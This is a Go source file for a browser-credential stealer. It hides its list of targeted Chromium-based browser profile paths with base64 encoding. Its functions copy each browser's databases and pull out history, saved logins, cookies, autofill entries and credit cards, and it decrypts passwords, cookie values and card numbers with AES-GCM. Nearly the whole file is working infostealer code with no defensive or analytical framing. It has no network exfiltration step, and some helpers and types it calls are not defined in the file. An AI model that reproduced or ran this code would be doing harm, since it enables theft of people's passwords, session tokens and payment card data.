package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/json"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

var encodedBrowsers = map[string]string{
	"YW1pZ28=":                     "XEFtaWdvXFVzZXIgRGF0YQ==",
	"dG9yY2g=":                     "XFRvcmNoXFVzZXIgRGF0YQ==",
	"a29tZXRh":                     "XEtvbWV0YVxVc2VyIERhdGE=",
	"b3JiaXR1bQ==":                 "XE9yYml0dW1cVXNlciBEYXRh",
	"Y2VudC1icm93c2Vy":             "XENlbnRCcm93c2VyXFVzZXIgRGF0YQ==",
	"N3N0YXI=":                     "XDdTdGFyXDdTdGFyXFVzZXIgRGF0YQ==",
	"c3B1dG5pa2I=":                 "XFNwdXRuaWtcU3B1dG5pa1xVc2VyIERhdGE=",
	"dml2YWxkaQ==":                 "XFZpdmFsZGlcVXNlciBEYXRh",
	"Z29vZ2xlLWNocm9tZS1zeHM=":     "XEdvb2dsZVxDaHJvbWUgU3hTXFVzZXIgRGF0YQ==",
	"Z29vZ2xlLWNocm9tZQ==":         "XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRh",
	"ZXBpYy1wcml2YWN5LWJyb3dzZXI=": "XEVwaWMgUHJpdmFjeSBCcm93c2VyXFVzZXIgRGF0YQ==",
	"bWljcm9zb2Z0LWVkZ2U=":         "XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YQ==",
	"dXJhbg==":                     "XFVDb3pNZWRpYVxVcmFuXFVzZXIgRGF0YQ==",
	"eWFuZGV4":                     "WVhZWFxZWFuZGV4QnJvd3NlclxVc2VyIERhdGE=",
	"YnJhdmU=":                     "XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGE=",
	"aXJpZGl1bQ==":                 "XElyaWRpdW1cVXNlciBEYXRh",
}

func collectBrowserData(appData string, browsers map[string]string) BrowserData {
	var data BrowserData
	installed := getInstalledBrowsers(appData, browsers)

	for _, browser := range installed {
		path := filepath.Join(appData, browsers[browser])
		if hist, err := getHistory(path, browser); err == nil {
			data.History = append(data.History, hist...)
		}
		if logins, err := getLogins(path, browser); err == nil {
			data.Logins = append(data.Logins, logins...)
		}
		if cookies, err := getCookies(path, browser); err == nil {
			data.Cookies = append(data.Cookies, cookies...)
		}
		if bookmarks, err := getBookmarks(path, browser); err == nil {
			data.Bookmarks = append(data.Bookmarks, bookmarks...)
		}
		if autofill, err := getAutofill(path, browser); err == nil {
			data.Autofill = append(data.Autofill, autofill...)
		}
		if cards, err := getCreditCards(path, browser); err == nil {
			data.CreditCards = append(data.CreditCards, cards...)
		}
	}

	return data
}

func getInstalledBrowsers(appData string, browsers map[string]string) []string {
	var installed []string
	for name, path := range browsers {
		fullPath := filepath.Join(appData, path)
		if _, err := os.Stat(fullPath); err == nil {
			installed = append(installed, name)
		}
	}
	return installed
}

func copyDB(src string) (string, error) {
	tempFile, err := ioutil.TempFile("", "dbcopy")
	if err != nil {
		return "", err
	}
	defer tempFile.Close()

	srcFile, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer srcFile.Close()

	_, err = io.Copy(tempFile, srcFile)
	if err != nil {
		return "", err
	}

	return tempFile.Name(), nil
}

func getHistory(browserPath, browser string) ([]HistoryEntry, error) {
	tempFile, err := copyDB(filepath.Join(browserPath, "Default", "History"))
	if err != nil {
		return nil, err
	}
	defer os.Remove(tempFile)

	db, err := sql.Open("sqlite3", tempFile)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`
		SELECT url, title, last_visit_time 
		FROM urls 
		ORDER BY last_visit_time DESC
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var entries []HistoryEntry
	for rows.Next() {
		var url, title string
		var ts int64
		if err := rows.Scan(&url, &title, &ts); err != nil {
			continue
		}
		entries = append(entries, HistoryEntry{
			URL:       url,
			Title:     title,
			VisitedAt: chromeTime(ts),
			Browser:   browser,
		})
	}
	return entries, nil
}

func getLogins(browserPath, browser string) ([]LoginEntry, error) {
	tempFile, err := copyDB(filepath.Join(browserPath, "Default", "Login Data"))
	if err != nil {
		return nil, err
	}
	defer os.Remove(tempFile)

	db, err := sql.Open("sqlite3", tempFile)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`
		SELECT action_url, username_value, password_value 
		FROM logins
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var entries []LoginEntry
	for rows.Next() {
		var url, user string
		var encrypted []byte
		if err := rows.Scan(&url, &user, &encrypted); err != nil {
			continue
		}
		password, _ := decryptPassword(encrypted, browserPath)
		entries = append(entries, LoginEntry{
			URL:      url,
			Username: user,
			Password: password,
			Browser:  browser,
		})
	}
	return entries, nil
}

func getCookies(browserPath, browser string) ([]CookieEntry, error) {
	tempFile, err := copyDB(filepath.Join(browserPath, "Default", "Network", "Cookies"))
	if err != nil {
		return nil, err
	}
	defer os.Remove(tempFile)

	db, err := sql.Open("sqlite3", tempFile)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`
		SELECT host_key, name, path, encrypted_value, expires_utc 
		FROM cookies
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var entries []CookieEntry
	for rows.Next() {
		var host, name, path string
		var encrypted []byte
		var expires int64
		if err := rows.Scan(&host, &name, &path, &encrypted, &expires); err != nil {
			continue
		}
		value, _ := decryptPassword(encrypted, browserPath)
		entries = append(entries, CookieEntry{
			Host:    host,
			Name:    name,
			Path:    path,
			Value:   value,
			Expires: expires,
			Browser: browser,
		})
	}
	return entries, nil
}

func getBookmarks(browserPath, browser string) ([]BookmarkEntry, error) {
	bookmarkFile := filepath.Join(browserPath, "Default", "Bookmarks")
	data, err := ioutil.ReadFile(bookmarkFile)
	if err != nil {
		return nil, err
	}

	var result struct {
		Roots struct {
			BookmarkBar struct {
				Children []struct {
					Name string `json:"name"`
					URL  string `json:"url"`
				} `json:"children"`
			} `json:"bookmark_bar"`
		} `json:"roots"`
	}

	if err := json.Unmarshal(data, &result); err != nil {
		return nil, err
	}

	var entries []BookmarkEntry
	for _, item := range result.Roots.BookmarkBar.Children {
		entries = append(entries, BookmarkEntry{
			Name:    item.Name,
			URL:     item.URL,
			Browser: browser,
		})
	}
	return entries, nil
}

func getAutofill(browserPath, browser string) ([]AutofillEntry, error) {
	tempFile, err := copyDB(filepath.Join(browserPath, "Default", "Web Data"))
	if err != nil {
		return nil, err
	}
	defer os.Remove(tempFile)

	db, err := sql.Open("sqlite3", tempFile)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`
		SELECT name, value 
		FROM autofill
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var entries []AutofillEntry
	for rows.Next() {
		var name, value string
		if err := rows.Scan(&name, &value); err != nil {
			continue
		}
		entries = append(entries, AutofillEntry{
			Name:    name,
			Value:   value,
			Browser: browser,
		})
	}
	return entries, nil
}

func getCreditCards(browserPath, browser string) ([]CreditCardEntry, error) {
	tempFile, err := copyDB(filepath.Join(browserPath, "Default", "Web Data"))
	if err != nil {
		return nil, err
	}
	defer os.Remove(tempFile)

	db, err := sql.Open("sqlite3", tempFile)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`
		SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted 
		FROM credit_cards
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var entries []CreditCardEntry
	for rows.Next() {
		var name string
		var month, year int
		var encrypted []byte
		if err := rows.Scan(&name, &month, &year, &encrypted); err != nil {
			continue
		}
		number, _ := decryptPassword(encrypted, browserPath)
		entries = append(entries, CreditCardEntry{
			Name:     name,
			ExpMonth: month,
			ExpYear:  year,
			Number:   number,
			Browser:  browser,
		})
	}
	return entries, nil
}

func chromeTime(utcMicroseconds int64) time.Time {
	return time.Unix((utcMicroseconds/1000000)-11644473600, 0)
}

func decryptPassword(encrypted []byte, browserPath string) (string, error) {
	if len(encrypted) == 0 {
		return "", nil
	}

	key, err := getMasterKey(browserPath)
	if err != nil {
		return "", err
	}

	nonce := encrypted[3:15]
	ciphertext := encrypted[15 : len(encrypted)-16]
	tag := encrypted[len(encrypted)-16:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	combined := append(ciphertext, tag...)
	decrypted, err := gcm.Open(nil, nonce, combined, nil)
	if err != nil {
		return "", err
	}

	return string(decrypted), nil
}
